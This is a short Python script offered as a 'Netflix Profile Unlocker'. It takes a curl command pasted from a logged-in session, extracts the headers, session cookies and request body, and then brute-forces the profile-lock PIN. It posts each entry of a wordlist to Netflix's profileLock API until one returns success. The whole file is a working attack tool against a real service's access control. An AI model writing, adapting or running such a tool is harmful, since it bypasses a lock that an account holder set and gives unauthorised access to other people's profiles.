# Very Simple Python Script to Unlock Netflix Profile Lock

import requests
import art
import re
import os
import json
import time

NETFLIX_PROFILE_LOCK_URL = 'https://www.netflix.com/api/shakti/mre/profileLock'
WORDLIST_PATH = os.path.join(os.path.dirname(__file__), 'testWL.txt')

def read_wordlist():
    with open(WORDLIST_PATH, 'r') as f:
        return f.read().splitlines()
    

def extract_curl_components(curl_command):
    # Extract the URL
    url_match = re.search(r"curl '(.*?)'", curl_command)
    url = url_match.group(1) if url_match else None

    # Extract headers
    headers = {}
    headers_matches = re.findall(r"-H '(.*?)'", curl_command)
    for header in headers_matches:
        key, value = header.split(": ", 1)
        headers[key] = value

    # Extract cookies
    cookies = {}
    if 'cookie' in headers:
        cookie_string = headers.pop('cookie')
        cookie_pairs = cookie_string.split('; ')
        for pair in cookie_pairs:
            key, value = pair.split('=', 1)
            cookies[key] = value

    # Extract data
    data_match = re.search(r"--data-raw '(.*?)'", curl_command)
    data = data_match.group(1) if data_match else None
    data = json.loads(data)

    return url, headers, cookies, data


if __name__ == "__main__":
    print(art.text2art("Netflix Profile Unlocker"))
    print("Enter the curl String")
    curl = input()

    try:
        url, headers, cookies, data = extract_curl_components(curl)
        WORDLIST = read_wordlist()
    except Exception as e:
        print(e)
        exit()

    for word in WORDLIST:
        time.sleep(0.1)
        data.update({'pin': word})
        response = requests.post(NETFLIX_PROFILE_LOCK_URL, headers=headers, cookies=cookies, json=data)

        if response.status_code == 200:
            print("Found Pin:", word)
            break
        else:
            print("Trying Pin:", word)

        



    

